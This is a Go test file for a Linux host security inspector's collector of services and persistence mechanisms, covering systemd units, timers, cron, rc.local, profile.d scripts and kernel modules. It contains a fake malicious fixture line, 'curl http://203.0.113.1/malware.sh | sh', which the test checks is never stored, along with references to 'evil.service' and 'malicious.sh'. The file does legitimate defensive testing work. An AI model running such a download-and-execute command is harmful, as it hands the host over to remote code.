package linux

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/bingooyong/AIHostSecurityInspector/backend/internal/collector"
	"github.com/bingooyong/AIHostSecurityInspector/backend/internal/domain"
)

func serviceReq() collector.Request {
	return collector.Request{
		ScanID: "scan-fixture-001", AttemptID: "attempt-fixture-001", HostID: "linux-test-001",
		ModuleID: ModuleServiceInventory, Profile: domain.ProfileQuick, PolicyVersion: "0.1.0",
	}
}

func persistenceReq() collector.Request {
	req := serviceReq()
	req.ModuleID = ModulePersistenceInventory
	return req
}

func TestServiceInventoryParsesUnitFilesWithoutExecuting(t *testing.T) {
	marker := filepath.Join(os.TempDir(), "PWNED-MUST-NOT-RUN")
	_ = os.Remove(marker)
	col := Persistence{Root: fixtureRoot(t, "host"), Now: func() time.Time { return time.Date(2026, 11, 21, 0, 0, 0, 0, time.UTC) }}
	result, err := col.Collect(context.Background(), serviceReq())
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != domain.CollectionSuccess && result.Status != domain.CollectionPartial {
		t.Fatalf("status=%s warnings=%v", result.Status, result.Warnings)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("fixture unit ExecStart was executed")
	}
	rec := result.Records[0]
	units := rec["units"].([]any)
	names := map[string]map[string]any{}
	for _, item := range units {
		unit := item.(map[string]any)
		names[unit["name"].(string)] = unit
	}
	sshd := names["sshd.service"]
	if sshd == nil || sshd["exec_start"] != "/usr/sbin/sshd -D" || sshd["user"] != "root" || sshd["state"] != "unit_file" {
		t.Fatalf("sshd %+v", sshd)
	}
	evil := names["evil.service"]
	if evil == nil || !strings.Contains(evil["exec_start"].(string), "/usr/bin/touch") {
		t.Fatalf("evil %+v", evil)
	}
	if names["backup.timer"] != nil {
		t.Fatal("timer leaked into service inventory")
	}
}

func TestPersistenceInventoryFromFixture(t *testing.T) {
	col := Persistence{Root: fixtureRoot(t, "host"), Now: func() time.Time { return time.Date(2026, 11, 21, 0, 0, 0, 0, time.UTC) }}
	result, err := col.Collect(context.Background(), persistenceReq())
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != domain.CollectionSuccess && result.Status != domain.CollectionPartial {
		t.Fatalf("status=%s warnings=%v", result.Status, result.Warnings)
	}
	payload, _ := json.Marshal(result)
	text := string(payload)
	if strings.Contains(text, "curl http://203.0.113.1/malware.sh | sh") {
		t.Fatal("profile body stored instead of metadata")
	}
	rec := result.Records[0]
	timers := rec["timers"].([]any)
	if len(timers) != 1 || timers[0].(map[string]any)["name"] != "backup.timer" {
		t.Fatalf("timers=%v", timers)
	}
	cron := rec["cron"].([]any)
	if len(cron) < 3 {
		t.Fatalf("cron=%v", cron)
	}
	if rec["at_status"] != domain.CollectionNotAvailable {
		t.Fatalf("at_status=%v", rec["at_status"])
	}
	rc := rec["rc_local"].(map[string]any)
	if rc["path"] != "etc/rc.local" || !domain.ValidSHA256(rc["sha256"].(string)) {
		t.Fatalf("rc_local %+v", rc)
	}
	profiles := rec["profiles"].([]any)
	foundMalicious := false
	for _, item := range profiles {
		profile := item.(map[string]any)
		if profile["path"] == "etc/profile.d/malicious.sh" {
			foundMalicious = true
			if !domain.ValidSHA256(profile["sha256"].(string)) {
				t.Fatalf("malicious profile %+v", profile)
			}
		}
	}
	if !foundMalicious {
		t.Fatalf("profiles=%v", profiles)
	}
	modules := rec["kernel_modules"].([]any)
	if len(modules) < 2 {
		t.Fatalf("modules=%v", modules)
	}
}

func TestServiceInventoryNotApplicableWithoutSystemd(t *testing.T) {
	col := Persistence{Root: fixtureRoot(t, "nosystemd"), Now: time.Now}
	result, err := col.Collect(context.Background(), serviceReq())
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != domain.CollectionNotApplicable {
		t.Fatalf("status=%s warnings=%v", result.Status, result.Warnings)
	}
}

func TestPersistenceLiveRootRejected(t *testing.T) {
	result, err := (Persistence{Root: "/", Now: time.Now}).Collect(context.Background(), persistenceReq())
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != domain.CollectionNotAvailable || result.ErrorCode != "ROOT_REJECTED" {
		t.Fatalf("live root accepted %+v", result)
	}
}

func TestPersistenceTimeout(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
	defer cancel()
	col := Persistence{Root: fixtureRoot(t, "host"), view: hangView{ctx: ctx}, Now: time.Now}
	req := persistenceReq()
	req.Limits.Timeout = 20 * time.Millisecond
	result, err := col.Collect(ctx, req)
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != domain.CollectionTimeout {
		t.Fatalf("status=%s", result.Status)
	}
}
